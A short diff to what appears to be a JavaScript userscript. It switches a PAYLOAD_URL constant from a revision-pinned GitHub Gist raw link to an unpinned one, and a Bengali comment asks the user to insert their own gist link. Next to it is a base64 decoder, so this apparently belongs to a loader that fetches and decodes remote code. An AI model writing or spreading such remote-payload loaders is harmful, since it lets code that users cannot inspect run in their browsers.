@@ -18,7 +18,7 @@
     'use strict';
 
     // Ekhane apnar NOTUN Github Gist er RAW link bosiye diben
-    const PAYLOAD_URL = 'https://gist.github.com/nkorim321-creator/81ded18ce5b8b44e5dfb06003f7fd100/raw/abed868715b224ec547f6c10a75766e76a64e27f/gistfile1.txt';
+    const PAYLOAD_URL = 'https://gist.github.com/nkorim321-creator/81ded18ce5b8b44e5dfb06003f7fd100/raw/gistfile1.txt';
 
     function b64ToBytes(b64) {
         const raw = atob(b64);
